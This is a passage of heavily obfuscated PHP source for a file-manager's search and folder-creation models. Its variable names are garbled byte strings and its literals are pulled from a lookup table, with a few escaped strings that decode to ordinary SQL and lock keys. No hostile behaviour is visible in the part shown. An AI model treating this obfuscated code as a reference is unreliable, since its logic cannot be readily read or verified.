$›Ø­§·€ = Model($”ÌÀàÏ€[513])->field($”ÌÀàÏ€[98])->where($½åœÌÆÄ)->select(); $›Ø­§·€ = array_to_keyvalue($›Ø­§·€, $”ÌÀàÏ€[22], $”ÌÀàÏ€[98]); $ı©áØˆŒ = array_unique($›Ø­§·€); $this->_listSearchMerge($‚Ç°áª°, $í—£à®, $ÁçîĞ§, $ı©áØˆŒ); } private function _listSearchDesc(&$â¯Ö”²Ò, $¶‰Ó§Ê„, $¯ˆÁ¸ß‰) { $€ˆ¥Ñ”¦ =& $_SERVER[ü¢ÙÊñÛ]; if (!$¶‰Ó§Ê„[$€ˆ¥Ñ”¦[2057]] || $â¯Ö”²Ò[$€ˆ¥Ñ”¦[454]][$€ˆ¥Ñ”¦[440]] > 1) { return; } $ç±û¬Ëò = array($€ˆ¥Ñ”¦[108] => $€ˆ¥Ñ”¦[537], $€ˆ¥Ñ”¦[462] => array($€ˆ¥Ñ”¦[470], $€ˆ¥Ñ”¦[2059] . $¶‰Ó§Ê„[$€ˆ¥Ñ”¦[2057]] . $€ˆ¥Ñ”¦[2059])); $í§Øêß„ = !1; if ($í§Øêß„) { $“ñŠÛ­ğ = $this->listSearchChildren($¶‰Ó§Ê„[$€ˆ¥Ñ”¦[203]]); $“ñŠÛ­ğ = array_unique($“ñŠÛ­ğ); if (!$“ñŠÛ­ğ) { return; } $ç±û¬Ëò[$€ˆ¥Ñ”¦[204]] = array($€ˆ¥Ñ”¦[17], $“ñŠÛ­ğ); } $„¼©î÷İ = Model($€ˆ¥Ñ”¦[646])->field($€ˆ¥Ñ”¦[204])->where($ç±û¬Ëò)->limit(5000)->select(); $ÀÌÊ€Õ = array_to_keyvalue($„¼©î÷İ, $€ˆ¥Ñ”¦[22], $€ˆ¥Ñ”¦[204]); $this->_listSearchMerge($â¯Ö”²Ò, $¶‰Ó§Ê„, $¯ˆÁ¸ß‰, $ÀÌÊ€Õ); } private function _listSearchGroupTag(&$ÅÏæ¶÷, $ËóÂ¸û, $‹æúÍ¹ó) { $ÈÄñÁŒ² =& $_SERVER[ü¢ÙÊñÛ]; if (!$ËóÂ¸û[$ÈÄñÁŒ²[2057]] || $ÅÏæ¶÷[$ÈÄñÁŒ²[454]][$ÈÄñÁŒ²[440]] > 1 || !$ËóÂ¸û[$ÈÄñÁŒ²[203]]) { return; } $ÀˆÉÖéù = $this->sourceInfo($ËóÂ¸û[$ÈÄñÁŒ²[203]]); if (!$ÀˆÉÖéù || $ÀˆÉÖéù[$ÈÄñÁŒ²[201]] != SourceModel::TYPE_GROUP) { return; } $¦Ş–ğà³ = $ÀˆÉÖéù[$ÈÄñÁŒ²[580]]; $“„ŸóÈ = Model($ÈÄñÁŒ²[2228])->get($¦Ş–ğà³); $–Ô£†ïá = array(); $Çáñªı° = $ËóÂ¸û[$ÈÄñÁŒ²[2057]]; foreach ($“„ŸóÈ[$ÈÄñÁŒ²[457]] as $÷†”˜ªÙ) { $†‡îÑüæ = $÷†”˜ªÙ[$ÈÄñÁŒ²[42]]; $Ğ÷˜ßŒÏ = str_replace($ÈÄñÁŒ²[63], $ÈÄñÁŒ²[22], Pinyin::get($†‡îÑüæ)); if (stripos($†‡îÑüæ, $Çáñªı°) !== !1 || stripos($Ğ÷˜ßŒÏ, $Çáñªı°) !== !1) { $–Ô£†ïá[] = $÷†”˜ªÙ[$ÈÄñÁŒ²[486]]; } } if (!$–Ô£†ïá) { return; } $ä›£¿Ÿ‹ = array($ÈÄñÁŒ²[511] => array($ÈÄñÁŒ²[17], $–Ô£†ïá), $ÈÄñÁŒ²[1759] => 0, $ÈÄñÁŒ²[43] => $ÈÄñÁŒ²[2079] . $¦Ş–ğà³); $Î¿Ôœ–ğ = Model($ÈÄñÁŒ²[513])->field($ÈÄñÁŒ²[98])->where($ä›£¿Ÿ‹)->select(); $Î¿Ôœ–ğ = array_to_keyvalue($Î¿Ôœ–ğ, $ÈÄñÁŒ²[22], $ÈÄñÁŒ²[98]); $ğ¦¦¼Ì² = array_unique($Î¿Ôœ–ğ); $this->_listSearchMerge($ÅÏæ¶÷, $ËóÂ¸û, $‹æúÍ¹ó, $ğ¦¦¼Ì²); } private function _listSearchMerge(&$šÜ¼†Á©, $‰­¯²Ø, $úĞ³Ù¢–, $Øİëâ) { $™ğãÉÒë =& $_SERVER[ü¢ÙÊñÛ]; if (!$Øİëâ) { return; } $üøÄÃˆÕ = array_to_keyvalue($šÜ¼†Á©[$™ğãÉÒë[457]], $™ğãÉÒë[22], $™ğãÉÒë[204]); $¦›Ù—® = array_diff($Øİëâ, $üøÄÃˆÕ); if (!$¦›Ù—®) { return; } $¹ÆÉŒ”Ì = array($™ğãÉÒë[204] => array($™ğãÉÒë[17], $¦›Ù—®)); $‰ËÛÅ = $this->field($úĞ³Ù¢–)->where($¹ÆÉŒ”Ì)->select(); if (!$‰ËÛÅ) { return; } $ìı„üüÚ = array(); foreach ($‰ËÛÅ as $æğ×µÂå) { if ($this->_listSearchFilter($æğ×µÂå, $‰­¯²Ø)) { $ìı„üüÚ[] = $æğ×µÂå; } } $šÜ¼†Á©[$™ğãÉÒë[457]] = array_merge($ìı„üüÚ, $šÜ¼†Á©[$™ğãÉÒë[457]]); $šÜ¼†Á©[$™ğãÉÒë[454]][$™ğãÉÒë[455]] += count($ìı„üüÚ); } private function _listSearchFilter($¤éû³ü«, $¬ÃöÓ¥ß) { $âÒÓßÖ¿ =& $_SERVER[ü¢ÙÊñÛ]; $›ë§ñ‘ = $¤éû³ü«[$âÒÓßÖ¿[496]] == $âÒÓßÖ¿[102]; if (!strstr($¤éû³ü«[$âÒÓßÖ¿[595]], $âÒÓßÖ¿[60] . $¬ÃöÓ¥ß[$âÒÓßÖ¿[203]] . $âÒÓßÖ¿[60])) { return !1; } if (isset($¬ÃöÓ¥ß[$âÒÓßÖ¿[497]]) && $¬ÃöÓ¥ß[$âÒÓßÖ¿[497]] != $âÒÓßÖ¿[841]) { if ($¬ÃöÓ¥ß[$âÒÓßÖ¿[497]] == $âÒÓßÖ¿[89] && !$›ë§ñ‘) { return !1; } if ($¬ÃöÓ¥ß[$âÒÓßÖ¿[497]] != $âÒÓßÖ¿[89] && $›ë§ñ‘) { return !1; } if (!strstr($¤éû³ü«[$âÒÓßÖ¿[180]], $âÒÓßÖ¿[60] . $¬ÃöÓ¥ß[$âÒÓßÖ¿[497]] . $âÒÓßÖ¿[60])) { return !1; } } if (isset($¬ÃöÓ¥ß[$âÒÓßÖ¿[2229]]) && $¬ÃöÓ¥ß[$âÒÓßÖ¿[2229]] < $¤éû³ü«[$âÒÓßÖ¿[90]]) { return !1; } if (isset($¬ÃöÓ¥ß[$âÒÓßÖ¿[2230]]) && $¬ÃöÓ¥ß[$âÒÓßÖ¿[2230]] > $¤éû³ü«[$âÒÓßÖ¿[90]]) { return !1; } if (isset($¬ÃöÓ¥ß[$âÒÓßÖ¿[676]]) && $¬ÃöÓ¥ß[$âÒÓßÖ¿[676]] != $¤éû³ü«[$âÒÓßÖ¿[540]]) { return !1; } return !0; } public function listSearchChildren($¿´‰™¿­, $Äª›Ô‘  = 5000) { $áìñª‹Ğ =& $_SERVER[ü¢ÙÊñÛ]; $ÛÌ¹§üç = array(); $áœôÖà³ = $this->sourceInfo($¿´‰™¿­); $Êàêº¹ = array($áìñª‹Ğ[595] => array($áìñª‹Ğ[470], $áœôÖà³[$áìñª‹Ğ[595]] . $áœôÖà³[$áìñª‹Ğ[204]] . $áìñª‹Ğ[627])); $÷À›«¡ì = $this->field($áìñª‹Ğ[90])->where($Êàêº¹)->limit($Äª›Ô‘  + 1)->select(); $¯Ø€ë²€ = is_array($÷À›«¡ì) ? count($÷À›«¡ì) : 0; if ($¯Ø€ë²€ > $Äª›Ô‘ ) { return $this->_listSearchChildrenNear($¿´‰™¿­, $Äª›Ô‘ ); } $‡š½õÉ = $this->field($áìñª‹Ğ[204])->where($Êàêº¹)->select(); $ÛÌ¹§üç = array_to_keyvalue($‡š½õÉ, $áìñª‹Ğ[22], $áìñª‹Ğ[204]); return $ÛÌ¹§üç; } private function _listSearchChildrenNear($”°˜ÍÎ«, $œÈ±Ò¯‹) { $µ›º¹Ò =& $_SERVER[ü¢ÙÊñÛ]; $€ãËÈ¬¡ = array(); $Í‚·ãÇò = array($µ›º¹Ò[203] => $”°˜ÍÎ«); $§ºÉ³å = $this->field($µ›º¹Ò[2231])->where($Í‚·ãÇò)->select(); $Ã›é–™Ü = array_to_keyvalue(array_filter_by_field($§ºÉ³å, $µ›º¹Ò[496], $µ›º¹Ò[102]), $µ›º¹Ò[22], $µ›º¹Ò[204]); $€ãËÈ¬¡ = array_merge($€ãËÈ¬¡, array_to_keyvalue($§ºÉ³å, $µ›º¹Ò[22], $µ›º¹Ò[204])); if (!$Ã›é–™Ü) { return $€ãËÈ¬¡; } $Í‚·ãÇò = array($µ›º¹Ò[203] => array($µ›º¹Ò[17], $Ã›é–™Ü)); $§ºÉ³å = $this->field($µ›º¹Ò[2231])->where($Í‚·ãÇò)->limit($œÈ±Ò¯‹)->select(); $€ãËÈ¬¡ = array_merge($€ãËÈ¬¡, array_to_keyvalue($§ºÉ³å, $µ›º¹Ò[22], $µ›º¹Ò[204])); $€ãËÈ¬¡ = array_slice($€ãËÈ¬¡, 0, intval($œÈ±Ò¯‹)); return $€ãËÈ¬¡; } private function _listSearchBindPinyin($‹ªùÑ»¸, &$â‰ éıÁ, &$¦’Ù…£¨) { $Ë¤”„İ… =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($‹ªùÑ»¸[$Ë¤”„İ…[2057]]) || !$‹ªùÑ»¸[$Ë¤”„İ…[2057]]) { return; } if (!Input::check($‹ªùÑ»¸[$Ë¤”„İ…[2057]], $Ë¤”„İ…[405]) || strlen($‹ªùÑ»¸[$Ë¤”„İ…[2057]]) < 2) { return; } $¹Ü»áğ = "\x4c\x45\106\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x73\x6f\x75\x72\x63\145\137\155\145\x74\x61\40\x6d\145\x74\x61\40\157\x6e\40\x73\x6f\x75\x72\x63\x65\56\163\x6f\x75\162\143\145\x49\x44\x20\75\40\x6d\x65\164\x61\56\163\x6f\165\x72\x63\x65\111\104"; $¬Å»ÒŒ± = array(); $¦’Ù…£¨ = str_replace(array($Ë¤”„İ…[10], $Ë¤”„İ…[63], $Ë¤”„İ…[2232]), $Ë¤”„İ…[22], $¦’Ù…£¨); $¦’Ù…£¨ = $Ë¤”„İ…[522] . str_replace($Ë¤”„İ…[60], $Ë¤”„İ…[523], $¦’Ù…£¨); $üûûª¬µ = $â‰ éıÁ[$Ë¤”„İ…[42]]; unset($â‰ éıÁ[$Ë¤”„İ…[42]]); foreach ($â‰ éıÁ as $­­ŞĞ¤Æ => $’Àè†¬) { $¬Å»ÒŒ±[$Ë¤”„İ…[522] . $­­ŞĞ¤Æ] = $’Àè†¬; } foreach ($üûûª¬µ as $ƒ¸Ö€ğ¿) { $¬Å»ÒŒ±[] = array($Ë¤”„İ…[527] => $ƒ¸Ö€ğ¿, $Ë¤”„İ…[1066] => $Ë¤”„İ…[2061], array($Ë¤”„İ…[2233] => $ƒ¸Ö€ğ¿, $Ë¤”„İ…[2234] => array($Ë¤”„İ…[17], array($Ë¤”„İ…[549], $Ë¤”„İ…[548])))); } $this->join($¹Ü»áğ); $â‰ éıÁ = $¬Å»ÒŒ±; } private function _parseSearchWhere($ŠûÍ¿) { $œÀü¶¤à =& $_SERVER[ü¢ÙÊñÛ]; $ÄœÌÍ¹ˆ = array(); if (isset($ŠûÍ¿[$œÀü¶¤à[825]]) && $ŠûÍ¿[$œÀü¶¤à[825]]) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[99]] = array($œÀü¶¤à[2235], $ŠûÍ¿[$œÀü¶¤à[825]]); } if (isset($ŠûÍ¿[$œÀü¶¤à[826]]) && $ŠûÍ¿[$œÀü¶¤à[826]]) { $ñºèš¸Õ = array($œÀü¶¤à[2236], $ŠûÍ¿[$œÀü¶¤à[826]]); if ($ÄœÌÍ¹ˆ[$œÀü¶¤à[99]]) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[99]] = array($ÄœÌÍ¹ˆ[$œÀü¶¤à[99]], $ñºèš¸Õ, $œÀü¶¤à[2237]); } else { $ÄœÌÍ¹ˆ[$œÀü¶¤à[99]] = $ñºèš¸Õ; } } if (isset($ŠûÍ¿[$œÀü¶¤à[2229]]) && $ŠûÍ¿[$œÀü¶¤à[2229]] > 0) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[90]] = array($œÀü¶¤à[2235], $ŠûÍ¿[$œÀü¶¤à[2229]]); } if (isset($ŠûÍ¿[$œÀü¶¤à[2230]]) && $ŠûÍ¿[$œÀü¶¤à[2230]]) { $ñºèš¸Õ = array($œÀü¶¤à[2236], $ŠûÍ¿[$œÀü¶¤à[2230]]); if ($ÄœÌÍ¹ˆ[$œÀü¶¤à[90]]) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[90]] = array($ÄœÌÍ¹ˆ[$œÀü¶¤à[90]], $ñºèš¸Õ, $œÀü¶¤à[2237]); } else { $ÄœÌÍ¹ˆ[$œÀü¶¤à[90]] = $ñºèš¸Õ; } } if (isset($ŠûÍ¿[$œÀü¶¤à[676]]) && $ŠûÍ¿[$œÀü¶¤à[676]]) { $ÄœÌÍ¹ˆ[] = array($œÀü¶¤à[540] => $ŠûÍ¿[$œÀü¶¤à[676]], $œÀü¶¤à[538] => $ŠûÍ¿[$œÀü¶¤à[676]], $œÀü¶¤à[1066] => $œÀü¶¤à[2061]); } if (isset($ŠûÍ¿[$œÀü¶¤à[497]]) && $ŠûÍ¿[$œÀü¶¤à[497]]) { $·úìÆİÊ = $ŠûÍ¿[$œÀü¶¤à[497]]; if ($·úìÆİÊ == $œÀü¶¤à[89]) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[496]] = 1; } else { if ($·úìÆİÊ == $œÀü¶¤à[2238]) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[496]] = 0; } else { if ($·úìÆİÊ) { $·úìÆİÊ = is_array($·úìÆİÊ) ? $·úìÆİÊ : explode($œÀü¶¤à[60], $·úìÆİÊ); $ÄœÌÍ¹ˆ[$œÀü¶¤à[497]] = array($œÀü¶¤à[503], $·úìÆİÊ); $ÄœÌÍ¹ˆ[$œÀü¶¤à[496]] = 0; } } } } $this->_parseSearchParent($ŠûÍ¿, $ÄœÌÍ¹ˆ); if (isset($ŠûÍ¿[$œÀü¶¤à[2057]]) && trim($ŠûÍ¿[$œÀü¶¤à[2057]])) { $Íå¢şÛ” = trim($ŠûÍ¿[$œÀü¶¤à[2057]]); $Œ“¯ïì = explode($œÀü¶¤à[63], $Íå¢şÛ”); if (strlen($Íå¢şÛ”) > 2 && (substr($Íå¢şÛ”, 0, 1) == $œÀü¶¤à[132] && substr($Íå¢şÛ”, -1) == $œÀü¶¤à[132]) || substr($Íå¢şÛ”, 0, 1) == $œÀü¶¤à[69] && substr($Íå¢şÛ”, -1) == $œÀü¶¤à[69]) { $Íå¢şÛ” = substr($Íå¢şÛ”, 1, -1); $Œ“¯ïì = array($Íå¢şÛ”); } $ÄœÌÍ¹ˆ[$œÀü¶¤à[42]] = array(array($œÀü¶¤à[626], $œÀü¶¤à[2059] . $Íå¢şÛ” . $œÀü¶¤à[2059])); if (count($Œ“¯ïì) > 1) { $ÄœÌÍ¹ˆ[$œÀü¶¤à[42]] = array(); foreach ($Œ“¯ïì as $ıÚş¿š) { if (!trim($ıÚş¿š)) { continue; } $ÄœÌÍ¹ˆ[$œÀü¶¤à[42]][] = array($œÀü¶¤à[626], $œÀü¶¤à[2059] . trim($ıÚş¿š) . $œÀü¶¤à[2059]); } } } return $ÄœÌÍ¹ˆ; } private function _parseSearchParent($’÷ßœ§, &$à“ˆÔ¾·) { $ïƒò£Òõ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($’÷ßœ§[$ïƒò£Òõ[203]]) || !$’÷ßœ§[$ïƒò£Òõ[203]]) { return; } $ñ­Õéª· = $this->pathInfo($’÷ßœ§[$ïƒò£Òõ[203]]); $×ª€¸óÁ = $ñ­Õéª·[$ïƒò£Òõ[203]] . $ïƒò£Òõ[22] === $ïƒò£Òõ[241]; $½à™˜Â‘ = $ñ­Õéª·[$ïƒò£Òõ[201]] == $ïƒò£Òõ[589]; if ($ñ­Õéª·[$ïƒò£Òõ[605]] == $ïƒò£Òõ[606]) { $¶„¿ìæ¹ = $this->sourceInfo($’÷ßœ§[$ïƒò£Òõ[203]]); $ñ­Õéª·[$ïƒò£Òõ[595]] = $¶„¿ìæ¹[$ïƒò£Òõ[595]]; } $à“ˆÔ¾·[$ïƒò£Òõ[666]] = array($ïƒò£Òõ[626], $ñ­Õéª·[$ïƒò£Òõ[595]] . $’÷ßœ§[$ïƒò£Òõ[203]] . $ïƒò£Òõ[627]); $öæÔ¨ = isset($’÷ßœ§[$ïƒò£Òõ[1917]]) && in_array($ïƒò£Òõ[589], $’÷ßœ§[$ïƒò£Òõ[1917]]); if (!$öæÔ¨ || !$½à™˜Â‘ || !$×ª€¸óÁ || !$ñ­Õéª·[$ïƒò£Òõ[498]]) { return; } if (!AuthModel::authCheckRoot($ñ­Õéª·[$ïƒò£Òõ[498]][$ïƒò£Òõ[499]])) { return; } $Æ–ä¾–¤ = $ñ­Õéª·[$ïƒò£Òõ[580]] . $ïƒò£Òõ[22]; if ($Æ–ä¾–¤ == $ïƒò£Òõ[102]) { unset($à“ˆÔ¾·[$ïƒò£Òõ[666]]); $à“ˆÔ¾·[$ïƒò£Òõ[201]] = self::TYPE_GROUP; return; } $»øÀÏ·ª = Model($ïƒò£Òõ[596])->groupChildrenAll($Æ–ä¾–¤); $À¶Ÿ›š» = count($»øÀÏ·ª); if ($À¶Ÿ›š» <= 1) { return; } $êÔ§ú˜Ü = array($ïƒò£Òõ[203] => 0, $ïƒò£Òõ[201] => self::TYPE_GROUP, $ïƒò£Òõ[580] => array($ïƒò£Òõ[17], $»øÀÏ·ª)); $º»·ºÙĞ = $this->field($ïƒò£Òõ[2239])->where($êÔ§ú˜Ü)->limit($À¶Ÿ›š»)->select(); $à“ˆÔ¾·[$ïƒò£Òõ[666]] = array(); foreach ($º»·ºÙĞ as $«‰œ§Š) { $à“ˆÔ¾·[$ïƒò£Òõ[666]][] = array($ïƒò£Òõ[626], $ïƒò£Òõ[604] . $«‰œ§Š[$ïƒò£Òõ[204]] . $ïƒò£Òõ[627]); } $à“ˆÔ¾·[$ïƒò£Òõ[666]][] = $ïƒò£Òõ[2061]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($æı…âÉı) { $À´ÍÓç‰ =& $_SERVER[ü¢ÙÊñÛ]; $îÆÖıü = Model($À´ÍÓç‰[588])->where(array($À´ÍÓç‰[1750] => $æı…âÉı))->find(); $çë€¼£æ = $this->_mkdirRoot(SourceModel::TYPE_USER, $æı…âÉı, $îÆÖıü[$À´ÍÓç‰[42]]); $this->userDesktopAdd($çë€¼£æ); return $çë€¼£æ; } public function userDesktopAdd($«ÇùƒÜ) { $®“Šø =& $_SERVER[ü¢ÙÊñÛ]; $ª†şâ·¤ = LNG($®“Šø[2240]); $¥œÄì¬ = $this->mkdir($«ÇùƒÜ, $ª†şâ·¤); $this->metaSet($¥œÄì¬, $®“Šø[2241], $®“Šø[102]); $this->metaSet($«ÇùƒÜ, $®“Šø[2242], $¥œÄì¬); } public function userPathSafeAdd($ñ© Ãï‡) { $Û×‚Ã¡¿ =& $_SERVER[ü¢ÙÊñÛ]; $„¼ íÄ­ = Model($Û×‚Ã¡¿[588])->getInfoFull($ñ© Ãï‡); if (!$„¼ íÄ­) { return !1; } if (_get($„¼ íÄ­, $Û×‚Ã¡¿[609])) { return $„¼ íÄ­[$Û×‚Ã¡¿[550]][$Û×‚Ã¡¿[2243]]; } $Ş†Ë™§… = $this->_mkdirRoot(SourceModel::TYPE_USER, $ñ© Ãï‡, $Û×‚Ã¡¿[2244], $Û×‚Ã¡¿[2245]); Model($Û×‚Ã¡¿[588])->metaSet($ñ© Ãï‡, $Û×‚Ã¡¿[2243], $Ş†Ë™§…); $this->metaSet($Ş†Ë™§…, $Û×‚Ã¡¿[2246], $ñ© Ãï‡); return $Ş†Ë™§…; } public function userPathAppAdd($àìçô†Š, $¬æÇ¬«ß = '', $Ëä Âåï = '') { $ì®ÊÜª =& $_SERVER[ü¢ÙÊñÛ]; $§şÀ•µ = Model($ì®ÊÜª[588])->getInfoFull($àìçô†Š); if (!$§şÀ•µ) { return !1; } $…ê«¤¼ü = $§şÀ•µ[$ì®ÊÜª[550]] ? $§şÀ•µ[$ì®ÊÜª[550]] : array(); $ºóÓ‚é¤ = $…ê«¤¼ü[$ì®ÊÜª[2247]]; if (!$ºóÓ‚é¤) { $ºóÓ‚é¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $àìçô†Š, $ì®ÊÜª[2248], $ì®ÊÜª[2249]); Model($ì®ÊÜª[588])->metaSet($àìçô†Š, $ì®ÊÜª[2247], $ºóÓ‚é¤ . $ì®ÊÜª[22]); $this->metaSet($ºóÓ‚é¤, $ì®ÊÜª[2247], $àìçô†Š); } if (!$¬æÇ¬«ß) { return $ºóÓ‚é¤; } $÷ËäÖÒ¶ = $…ê«¤¼ü[$ì®ÊÜª[2250] . $¬æÇ¬«ß]; if (!$÷ËäÖÒ¶) { $÷ËäÖÒ¶ = $this->mkdir($ºóÓ‚é¤, $¬æÇ¬«ß); Model($ì®ÊÜª[588])->metaSet($àìçô†Š, $ì®ÊÜª[2250] . $¬æÇ¬«ß, $÷ËäÖÒ¶); $this->metaSet($÷ËäÖÒ¶, $ì®ÊÜª[2250] . $¬æÇ¬«ß, $àìçô†Š); } if (!$Ëä Âåï) { return $÷ËäÖÒ¶; } $¨ÛòåÈü = $this->mkdir($÷ËäÖÒ¶, $Ëä Âåï); return $¨ÛòåÈü; } public function groupRootAdd($ïíæÑâÌ) { $ã‚ÒÈ‘§ =& $_SERVER[ü¢ÙÊñÛ]; $÷·ğ—ô = Model($ã‚ÒÈ‘§[596])->where(array($ã‚ÒÈ‘§[2051] => $ïíæÑâÌ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ïíæÑâÌ, $÷·ğ—ô[$ã‚ÒÈ‘§[42]]); } public function systemRootPathAdd($Ï°åÀ›Š) { if ($Ï°åÀ›Š != $_SERVER[ü¢ÙÊñÛ][619]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ï°åÀ›Š); } public function userRootRemove($Îî¾‚¸) { $ß¿Ì¸™Ã = $this->targetSourceRoot(SourceModel::TYPE_USER, $Îî¾‚¸, !0); foreach ($ß¿Ì¸™Ã as $ş”“£Öæ) { if (!$ş”“£Öæ) { continue; } $this->remove($ş”“£Öæ[$_SERVER[ü¢ÙÊñÛ][204]], !1); } } public function groupRootRemove($æ¼—œ‰) { $êû±¼â£ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $æ¼—œ‰); if (!$êû±¼â£) { return; } $this->remove($êû±¼â£[$_SERVER[ü¢ÙÊñÛ][204]], !1); } private function _mkdirRoot($‡’³Ê½÷, $¤ÍãºˆÄ, $™”€İã, $Ï„Õ‘€î = '') { $ö„ùãÂ‹ =& $_SERVER[ü¢ÙÊñÛ]; $Ï¸ŸÎÚ¯ = defined($ö„ùãÂ‹[2186]) ? USER_ID : 0; $‰øÌŠŞÜ = array($ö„ùãÂ‹[488] => 0, $ö„ùãÂ‹[662] => $‡’³Ê½÷, $ö„ùãÂ‹[663] => $¤ÍãºˆÄ, $ö„ùãÂ‹[660] => 1, $ö„ùãÂ‹[664] => $Ï¸ŸÎÚ¯, $ö„ùãÂ‹[665] => $Ï¸ŸÎÚ¯, $ö„ùãÂ‹[661] => $Ï„Õ‘€î, $ö„ùãÂ‹[666] => $ö„ùãÂ‹[604], $ö„ùãÂ‹[515] => 0, $ö„ùãÂ‹[631] => 0, $ö„ùãÂ‹[553] => 0, $ö„ùãÂ‹[667] => $ö„ùãÂ‹[22]); if ($îĞŞÀ = $this->where($‰øÌŠŞÜ)->find()) { return $îĞŞÀ[$ö„ùãÂ‹[204]]; } $²çüµè = "\115\157\144\x65\154\123\x6f\165\x72\143\145\x2e\155\153\144\151\x72\x52\x6f\x6f\164\x2e{$‡’³Ê½÷}\x2e{$¤ÍãºˆÄ}\56" . $™”€İã; CacheLock::lock($²çüµè); $‰øÌŠŞÜ[$ö„ùãÂ‹[42]] = $™”€İã; $ŒîÃ´õ” = $this->add($‰øÌŠŞÜ); $…ƒôÎ€ = array($ö„ùãÂ‹[668] => short_id($ŒîÃ´õ”)); $this->where(array($ö„ùãÂ‹[502] => $ŒîÃ´õ”))->save($…ƒôÎ€); CacheLock::unlock($²çüµè); return $ŒîÃ´õ”; } private function targetSourceRoot($˜›Ş’, $Œ‘è–şÙ, $ê¯î±âË = false) { $¸ÊÉ‘ƒ =& $_SERVER[ü¢ÙÊñÛ]; $ûæğÊØÆ = array($¸ÊÉ‘ƒ[488] => 0, $¸ÊÉ‘ƒ[662] => $˜›Ş’, $¸ÊÉ‘ƒ[663] => $Œ‘è–şÙ); if ($ê¯î±âË) { $âŸí¯Ë— = $this->where($ûæğÊØÆ)->select(); return $âŸí¯Ë— ? $âŸí¯Ë— : array(); } $ÈÌ²†Èè = $this->where($ûæğÊØÆ)->find(); return $ÈÌ²†Èè ? $ÈÌ²†Èè : array(); } public function sourceRootGroup($¼‹åùè¦) { $®“ÂÓØß =& $_SERVER[ü¢ÙÊñÛ]; if (is_string($¼‹åùè¦)) { $¼‹åùè¦ = array($¼‹åùè¦); } $¨ã©î¥ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¼‹åùè¦, $®“ÂÓØß[233]); $’øÏ‡¿æ = array($®“ÂÓØß[457] => $¨ã©î¥, $®“ÂÓØß[454] => array($®“ÂÓØß[823] => count($¼‹åùè¦))); $this->_listDataApply($’øÏ‡¿æ[$®“ÂÓØß[457]]); $this->_listMake($’øÏ‡¿æ); return array_to_keyvalue($’øÏ‡¿æ[$®“ÂÓØß[96]], $®“ÂÓØß[580]); } public function mkfile($€Ä‚ŠŒÃ, $ì¦•É¿ä, $˜Ñ¦®Ì = '', $ú“ë³÷ò = REPEAT_RENAME) { $“Ş—Åıâ =& $_SERVER[ü¢ÙÊñÛ]; $–”Åö¦Ö = Model($“Ş—Åıâ[688])->addFileByContent($˜Ñ¦®Ì, $ì¦•É¿ä); return $this->_createFileCall($€Ä‚ŠŒÃ, $ì¦•É¿ä, $–”Åö¦Ö, $ú“ë³÷ò, $“Ş—Åıâ[1420]); } public function addFile($ŸÙ‡øò¤, $ùáàÏ÷ù, $ÙÂ¨¡ş¦, $äÓùºïŠ = false, $¤‘ïƒóª = REPEAT_RENAME) { $ÃÍñˆ–‘ = Model($_SERVER[ü¢ÙÊñÛ][688])->addFile($ùáàÏ÷ù, $ÙÂ¨¡ş¦, $äÓùºïŠ); return $this->_createFileCall($ŸÙ‡øò¤, $ÙÂ¨¡ş¦, $ÃÍñˆ–‘, $¤‘ïƒóª); } public function addFileByFileID($¤òì¨‚Ú, $”¸£ÂÁ—, $•ç¾ûñ‹, $¾¶Öš£ = REPEAT_RENAME) { $üÄûÍ‰ =& $_SERVER[ü¢ÙÊñÛ]; $µÅ¨‰„ = Model($üÄûÍ‰[688])->find($”¸£ÂÁ—); Model($üÄûÍ‰[688])->linkAdd($”¸£ÂÁ—); return $this->_createFileCall($¤òì¨‚Ú, $•ç¾ûñ‹, $µÅ¨‰„, $¾¶Öš£); } public function addFileByRemote($¢àè÷¹Ú, $„ïŠŞğà, $éôÔşÚÑ, $ÌÖğÈı¸ = array(), $•×³¤‰ = REPEAT_RENAME) { $ã¬“È”Â = Model($_SERVER[ü¢ÙÊñÛ][688])->addFileByRemote($„ïŠŞğà, $éôÔşÚÑ, $ÌÖğÈı¸); return $this->_createFileCall($¢àè÷¹Ú, $éôÔşÚÑ, $ã¬“È”Â, $•×³¤‰); } private function _createFileCall($šÉû°Ñó, $ÀÖçÜ÷, $ŒÉšñ­î, $§åçªÛ, $‚—£¦… = "\165\160\x6c\157\x61\144") { $ÉºÏ… =& $_SERVER[ü¢ÙÊñÛ]; $ë“ïÜ–¹ = !1; $this->setMasterDB(); $this->lockWriteStart($šÉû°Ñó, $ÀÖçÜ÷); $ò§Ãšó± = $this->fileNameExist($šÉû°Ñó, $ÀÖçÜ÷); $¾—·²äÏ = $this->_createFile($šÉû°Ñó, $ÀÖçÜ÷, $ŒÉšñ­î, $§åçªÛ, $ë“ïÜ–¹); if (!$ë“ïÜ–¹) { Model($ÉºÏ…[555])->remove($ŒÉšñ­î[$ÉºÏ…[552]]); } if ($ë“ïÜ–¹ && $¾—·²äÏ && $¾—·²äÏ != $ò§Ãšó±) { Model($ÉºÏ…[2213])->eventCreate($¾—·²äÏ, $‚—£¦…); } $this->lockWriteEnd($šÉû°Ñó, $ÀÖçÜ÷); return $¾—·²äÏ; } public function mkdir($éµ±ƒ™í, $åş„„åí, $ñŸª¯Ì = REPEAT_SKIP) { $¬Ü—é¡ =& $_SERVER[ü¢ÙÊñÛ]; $this->setMasterDB(); $…ŸßÍµå = $this->sourceInfo($éµ±ƒ™í); if (!$…ŸßÍµå) { return !1; } $this->lockWriteStart($éµ±ƒ™í, $åş„„åí); if ($ñŸª¯Ì !== !1) { $Ù”—Ëò¬ = $this->fileNameExist($éµ±ƒ™í, $åş„„åí); if ($Ù”—Ëò¬ && $ñŸª¯Ì != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($éµ±ƒ™í, $åş„„åí); return 